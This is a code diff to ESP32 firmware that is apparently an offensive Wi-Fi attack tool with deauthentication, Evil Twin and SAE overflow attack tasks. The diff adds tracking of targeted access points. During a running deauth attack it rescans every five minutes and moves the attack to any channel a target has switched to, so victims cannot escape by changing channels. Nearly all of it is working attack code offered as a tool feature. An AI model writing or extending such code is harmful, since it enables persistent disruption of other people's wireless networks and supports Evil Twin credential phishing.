@@ -76,6 +76,15 @@ typedef struct {
     uint32_t last_seen;
 } probe_request_t;
 
+// Target BSSID structure for channel monitoring
+typedef struct {
+    uint8_t bssid[6];
+    char ssid[33];
+    uint8_t channel;
+    uint32_t last_seen;
+    bool active;
+} target_bssid_t;
+
 // Sniffer data structures
 typedef struct {
     uint8_t mac[6];
@@ -132,6 +141,13 @@ static TaskHandle_t sniffer_channel_task_handle = NULL;
 // Deauth/Evil Twin attack task
 static TaskHandle_t deauth_attack_task_handle = NULL;
 static volatile bool deauth_attack_active = false;
+
+// Target BSSID monitoring
+#define MAX_TARGET_BSSIDS 10
+static target_bssid_t target_bssids[MAX_TARGET_BSSIDS];
+static int target_bssid_count = 0;
+static uint32_t last_channel_check_time = 0;
+static const uint32_t CHANNEL_CHECK_INTERVAL_MS = 5 * 60 * 1000; // 5 minutes
 
 // SAE Overflow attack task
 static TaskHandle_t sae_attack_task_handle = NULL;
@@ -226,6 +242,11 @@ static int cmd_reboot(int argc, char **argv);
 static esp_err_t start_background_scan(void);
 static void print_scan_results(void);
 static void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count);
+// Target BSSID management functions
+static void save_target_bssids(void);
+static esp_err_t quick_channel_scan(void);
+static bool check_channel_changes(void);
+static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan_count);
 // Attack task forward declarations
 static void deauth_attack_task(void *pvParameters);
 static void sae_attack_task(void *pvParameters);
@@ -569,6 +590,161 @@ static esp_err_t start_background_scan(void) {
     return ESP_OK;
 }
 
+// Save target BSSIDs for channel monitoring
+static void save_target_bssids(void) {
+    target_bssid_count = 0;
+    
+    for (int i = 0; i < g_selected_count && target_bssid_count < MAX_TARGET_BSSIDS; ++i) {
+        int idx = g_selected_indices[i];
+        wifi_ap_record_t *ap = &g_scan_results[idx];
+        
+        target_bssids[target_bssid_count].channel = ap->primary;
+        target_bssids[target_bssid_count].last_seen = esp_timer_get_time() / 1000;
+        target_bssids[target_bssid_count].active = true;
+        
+        // Copy BSSID
+        memcpy(target_bssids[target_bssid_count].bssid, ap->bssid, 6);
+        
+        // Copy SSID
+        strncpy(target_bssids[target_bssid_count].ssid, (const char*)ap->ssid, 32);
+        target_bssids[target_bssid_count].ssid[32] = '\0';
+        
+        target_bssid_count++;
+    }
+    
+    MY_LOG_INFO(TAG, "Saved %d target BSSIDs for channel monitoring", target_bssid_count);
+    
+    // Debug: Print saved target BSSIDs
+    for (int i = 0; i < target_bssid_count; ++i) {
+        MY_LOG_INFO(TAG, "Target BSSID[%d]: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, Channel: %d", 
+                   i, target_bssids[i].ssid,
+                   target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
+                   target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5],
+                   target_bssids[i].channel);
+    }
+}
+
+// Static buffer for quick scan to avoid stack overflow (smaller buffer for channel monitoring)
+#define QUICK_SCAN_MAX_APS 32
+static wifi_ap_record_t quick_scan_results[QUICK_SCAN_MAX_APS];
+
+// Quick channel scan for target BSSIDs
+static esp_err_t quick_channel_scan(void) {
+    MY_LOG_INFO(TAG, "Starting quick channel scan for target BSSIDs...");
+    
+    // Use the main scanning function instead of quick scan
+    esp_err_t err = start_background_scan();
+    if (err != ESP_OK) {
+        MY_LOG_INFO(TAG, "Quick scan failed: %s", esp_err_to_name(err));
+        return err;
+    }
+    
+    // Wait for scan to complete
+    int timeout = 0;
+    while (g_scan_in_progress && timeout < 200) { // 20 seconds timeout
+        vTaskDelay(pdMS_TO_TICKS(100));
+        timeout++;
+    }
+    
+    if (g_scan_in_progress) {
+        MY_LOG_INFO(TAG, "Quick scan timeout");
+        return ESP_ERR_TIMEOUT;
+    }
+    
+    if (!g_scan_done || g_scan_count == 0) {
+        MY_LOG_INFO(TAG, "No scan results available");
+        return ESP_ERR_NOT_FOUND;
+    }
+    
+    MY_LOG_INFO(TAG, "Successfully retrieved %d scan records", g_scan_count);
+    
+    // Copy scan results to our buffer
+    uint16_t copy_count = (g_scan_count < QUICK_SCAN_MAX_APS) ? g_scan_count : QUICK_SCAN_MAX_APS;
+    memcpy(quick_scan_results, g_scan_results, copy_count * sizeof(wifi_ap_record_t));
+    
+    // Update target channels based on scan results
+    update_target_channels(quick_scan_results, copy_count);
+    
+    MY_LOG_INFO(TAG, "Quick channel scan completed");
+    return ESP_OK;
+}
+
+// Update target channels based on latest scan results
+static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan_count) {
+    bool channel_changed = false;
+    
+    MY_LOG_INFO(TAG, "Updating target channels with %d scan results", scan_count);
+    
+    // Debug: Print all scan results
+    for (int i = 0; i < scan_count; ++i) {
+        MY_LOG_INFO(TAG, "Scan result[%d]: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, Channel: %d", 
+                   i, scan_results[i].ssid,
+                   scan_results[i].bssid[0], scan_results[i].bssid[1], scan_results[i].bssid[2],
+                   scan_results[i].bssid[3], scan_results[i].bssid[4], scan_results[i].bssid[5],
+                   scan_results[i].primary);
+    }
+    
+    for (int i = 0; i < target_bssid_count; ++i) {
+        if (!target_bssids[i].active) continue;
+        
+        MY_LOG_INFO(TAG, "Checking target BSSID %s (current channel: %d)", 
+                   target_bssids[i].ssid, target_bssids[i].channel);
+        
+        // Find matching BSSID in scan results
+        bool found = false;
+        for (int j = 0; j < scan_count; ++j) {
+            if (memcmp(target_bssids[i].bssid, scan_results[j].bssid, 6) == 0) {
+                uint8_t old_channel = target_bssids[i].channel;
+                target_bssids[i].channel = scan_results[j].primary;
+                target_bssids[i].last_seen = esp_timer_get_time() / 1000;
+                found = true;
+                
+                MY_LOG_INFO(TAG, "Found target BSSID %s in scan results, channel: %d", 
+                           target_bssids[i].ssid, scan_results[j].primary);
+                
+                if (old_channel != target_bssids[i].channel) {
+                    MY_LOG_INFO(TAG, "Channel change detected for %s: %d -> %d", 
+                               target_bssids[i].ssid, old_channel, target_bssids[i].channel);
+                    channel_changed = true;
+                }
+                break;
+            }
+        }
+        
+        if (!found) {
+            MY_LOG_INFO(TAG, "Target BSSID %s not found in scan results", target_bssids[i].ssid);
+        }
+    }
+    
+    if (channel_changed) {
+        MY_LOG_INFO(TAG, "Channel changes detected, will resume deauth on new channels");
+        
+        // Update g_scan_results with new channel information
+        for (int i = 0; i < g_selected_count; ++i) {
+            int idx = g_selected_indices[i];
+            for (int j = 0; j < target_bssid_count; ++j) {
+                if (memcmp(g_scan_results[idx].bssid, target_bssids[j].bssid, 6) == 0) {
+                    g_scan_results[idx].primary = target_bssids[j].channel;
+                    MY_LOG_INFO(TAG, "Updated g_scan_results[%d] channel to %d", idx, target_bssids[j].channel);
+                    break;
+                }
+            }
+        }
+    }
+}
+
+// Check if it's time for channel check
+static bool check_channel_changes(void) {
+    uint32_t current_time = esp_timer_get_time() / 1000; // Convert to milliseconds
+    
+    if (current_time - last_channel_check_time >= CHANNEL_CHECK_INTERVAL_MS) {
+        last_channel_check_time = current_time;
+        return true;
+    }
+    
+    return false;
+}
+
 static void escape_csv_field(const char* input, char* output, size_t output_size) {
     if (!input || !output || output_size < 2) return;
     
@@ -786,6 +962,19 @@ static void deauth_attack_task(void *pvParameters) {
             break;
         }
         
+        // Check if it's time for channel monitoring (every 5 minutes)
+        if (check_channel_changes()) {
+            MY_LOG_INFO(TAG, "Performing periodic channel check...");
+            
+            // Temporarily pause deauth for scanning
+            esp_err_t scan_result = quick_channel_scan();
+            if (scan_result == ESP_OK) {
+                MY_LOG_INFO(TAG, "Channel check completed, resuming deauth");
+            } else {
+                MY_LOG_INFO(TAG, "Channel check failed, continuing with current channels");
+            }
+        }
+        
         if (applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) {
             // Send deauth frames (silent mode - no UART spam)
             ESP_ERROR_CHECK(led_strip_set_pixel(strip, 0, 0, 0, 255));
@@ -808,6 +997,11 @@ static void deauth_attack_task(void *pvParameters) {
     
     deauth_attack_active = false;
     deauth_attack_task_handle = NULL;
+    
+    // Clear target BSSIDs when attack ends
+    target_bssid_count = 0;
+    memset(target_bssids, 0, sizeof(target_bssids));
+    
     MY_LOG_INFO(TAG,"Deauth attack task finished.");
     
     vTaskDelete(NULL); // Delete this task
@@ -928,6 +1122,11 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             wifi_ap_record_t *ap = &g_scan_results[idx];
             MY_LOG_INFO(TAG,"  [%d] SSID='%s' Ch=%d RSSI=%d", idx, (const char*)ap->ssid, ap->primary, ap->rssi);
         }
+        
+        // Save target BSSIDs for channel monitoring
+        save_target_bssids();
+        last_channel_check_time = esp_timer_get_time() / 1000; // Convert to milliseconds
+        
         MY_LOG_INFO(TAG,"Deauth attack started. Use 'stop' to stop.");
         
         // Start deauth attack in background task
@@ -978,6 +1177,10 @@ static int cmd_stop(int argc, char **argv) {
             deauth_attack_task_handle = NULL;
             MY_LOG_INFO(TAG, "Deauth attack task forcefully stopped.");
         }
+        
+        // Clear target BSSIDs
+        target_bssid_count = 0;
+        memset(target_bssids, 0, sizeof(target_bssids));
     }
     
     // Stop SAE overflow attack task if running
